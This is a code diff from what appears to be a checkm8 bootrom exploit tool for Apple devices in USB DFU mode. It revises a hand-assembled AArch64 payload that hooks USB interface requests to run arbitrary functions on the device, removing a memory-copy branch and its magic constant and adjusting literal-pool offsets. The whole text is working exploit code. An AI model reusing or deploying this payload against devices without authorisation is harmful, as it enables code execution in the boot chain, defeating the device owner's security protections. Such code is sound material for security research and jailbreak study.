@@ -60,7 +60,6 @@
 #define DFU_STATE_MANIFEST_WAIT_RESET (8)
 #define DONE_MAGIC (0x646F6E65646F6E65ULL)
 #define EXEC_MAGIC (0x6578656365786563ULL)
-#define MEMC_MAGIC (0x6D656D636D656D63ULL)
 #define USB_MAX_STRING_DESCRIPTOR_IDX (10)
 
 #define LZSS_F (18)
@@ -1098,55 +1097,40 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		0xD65F03C0 /* ret */
 	}, payload_handle_checkm8_request[] = {
 		/* _main: */
-		0x58000687, /* ldr x7, =handle_interface_request */
+		0x580004C7, /* ldr x7, =handle_interface_request */
 		0xD61F00E0, /* br x7 */
 		0x17FFFFFE, /* b _main */
 		0x79400002, /* ldrh w2, [x0] */
 		0x710A845F, /* cmp w2, #0x2A1 */
-		0x54FFFF61, /* bne _handle_interface_request_tramp */
+		0x54FFFF61, /* bne _main */
 		0xA9BF7BFD, /* stp x29, x30, [sp, #-0x10]! */
 		0xA9BF53F3, /* stp x19, x20, [sp, #-0x10]! */
 		0xAA0003F3, /* mov x19, x0 */
-		0x580005B4, /* ldr x20, =insecure_memory_base */
+		0x580003F4, /* ldr x20, =insecure_memory_base */
 		0x529FFFE1, /* mov w1, #0xFFFF */
 		0x79400662, /* ldrh w2, [x19, #0x2] */
 		0x6B02003F, /* cmp w1, w2 */
-		0x540003A1, /* bne _request_done */
+		0x540001E1, /* bne _request_done */
 		0xF9400280, /* ldr x0, [x20] */
-		0x58000521, /* ldr x1, =exec_magic */
+		0x58000361, /* ldr x1, =exec_magic */
 		0xEB01001F, /* cmp x0, x1 */
-		0x540001E1, /* bne _not_exec */
+		0x54000161, /* bne _request_done */
 		0xF900029F, /* str xzr, [x20] */
-		0xF9400A80, /* ldr x0, [x20, #0x10] */
-		0xF9400E81, /* ldr x1, [x20, #0x18] */
-		0xF9401282, /* ldr x2, [x20, #0x20] */
-		0xF9401683, /* ldr x3, [x20, #0x28] */
-		0xF9401A84, /* ldr x4, [x20, #0x30] */
-		0xF9401E85, /* ldr x5, [x20, #0x38] */
+		0xA9410680, /* ldp x0, x1, [x20, #0x10] */
+		0xA9420E82, /* ldp x2, x3, [x20, #0x20] */
+		0xA9431684, /* ldp x4, x5, [x20, #0x30] */
 		0xF9402286, /* ldr x6, [x20, #0x40] */
 		0xF9402687, /* ldr x7, [x20, #0x48] */
 		0xF9400688, /* ldr x8, [x20, #0x8] */
 		0xD63F0100, /* blr x8 */
-		0x580003A8, /* ldr x8, =done_magic */
-		0xA9000288, /* stp x8, x0, [x20] */
-		0x1400000B, /* b _request_done */
-		/* _not_exec: */
-		0x58000381, /* ldr x1, =memc_magic */
-		0xEB01001F, /* cmp x0, x1 */
-		0x54000101, /* bne _request_done */
-		0xF900029F, /* str xzr, [x20] */
-		0xA9410680, /* ldp x0, x1, [x20, #0x10] */
-		0xF9401282, /* ldr x2, [x20, #0x20] */
-		0x58000303, /* ldr x3, =memcpy_addr */
-		0xD63F0060, /* blr x3 */
 		0x58000248, /* ldr x8, =done_magic */
-		0xF9000288, /* str x8, [x20] */
+		0xA9000288, /* stp x8, x0, [x20] */
 		/* _request_done: */
 		0x52801000, /* mov w0, #0x80 */
 		0xAA1403E1, /* mov x1, x20 */
 		0x79400E62, /* ldrh w2, [x19, #0x6] */
 		0xAA1F03E3, /* mov x3, xzr */
-		0x58000244, /* ldr x4, =usb_core_do_transfer */
+		0x580001C4, /* ldr x4, =usb_core_do_transfer */
 		0xD63F0080, /* blr x4 */
 		0x52800000, /* mov w0, #0 */
 		0xA8C153F3, /* ldp x19, x20, [sp], #0x10 */
@@ -1163,7 +1147,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	} A9;
 	struct {
 		uint8_t payload[sizeof(payload_handle_checkm8_request)];
-		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
+		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, usb_core_do_transfer;
 	} handle_checkm8_request;
 	callback_t callbacks[] = {
 		{ enter_critical_section, 0 },
@@ -1238,8 +1222,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	handle_checkm8_request.insecure_memory_base = insecure_memory_base;
 	handle_checkm8_request.exec_magic = EXEC_MAGIC;
 	handle_checkm8_request.done_magic = DONE_MAGIC;
-	handle_checkm8_request.memc_magic = MEMC_MAGIC;
-	handle_checkm8_request.memcpy_addr = memcpy_addr;
 	handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
 	memcpy(payload + payload_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
 	payload_sz += sizeof(handle_checkm8_request);
